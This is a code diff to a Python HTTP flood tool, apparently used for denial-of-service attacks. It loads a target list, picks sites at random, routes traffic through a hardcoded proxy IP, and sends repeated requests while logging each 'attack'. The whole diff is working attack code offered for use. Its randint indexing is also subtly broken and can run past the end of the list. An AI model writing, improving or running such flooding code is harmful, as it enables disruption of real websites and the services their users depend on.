@@ -9,6 +9,7 @@ from loguru import logger
 from sys import stderr
 from threading import Thread
 from random import choice
+from random import randint
 from time import sleep
 from urllib3 import disable_warnings
 from pyuseragents import random as random_useragent
@@ -106,23 +107,27 @@ def get_proxy(data, checker):
 def mainth():
     current_target = None
 
+    # Fetching data with proxy and targets
+    with open('list.txt') as f:
+        sites = f.read().splitlines()
+
     while True:
-
         scraper = base_scraper()
-
         logger.info("GET RESOURCES FOR ATTACK")
-
-        # Fetching data with proxy and targets
-        with open('list.txt') as f:
-            sites = f.read().splitlines()
-
-        data = choice(sites)
+        # data = choice(sites)
+        index_ = randint(0, len(sites))
+        data = sites[index_]
 
         if current_target is None:
             current_target = unquote(data)
 
         if current_target.startswith('http') is False:
             current_target = "https://" + current_target
+
+        ip = '193.23.50.206'
+        proxy_str = (ip + ":11335")
+        scraper.proxies.update({'http': "http://" + proxy_str,
+                                'https': "http://" + proxy_str})
 
         logger.info("STARTING ATTACK TO " + current_target)
         for _ in range(MAX_REQUESTS):
@@ -134,9 +139,10 @@ def mainth():
                 else:
                     response = scraper.get(current_target)
                 logger.info("ATTACKED; RESPONSE CODE: " +
-                            str(response.status_code))
+                            str(response.status_code) + " " + data)
             except Exception as err:
-                logger.warning("GOT ISSUE WHILE ATTACKING")
+                logger.warning("GOT ISSUE WHILE ATTACKING " + data)
+                sites.pop(index_)
 
 
 def cleaner():
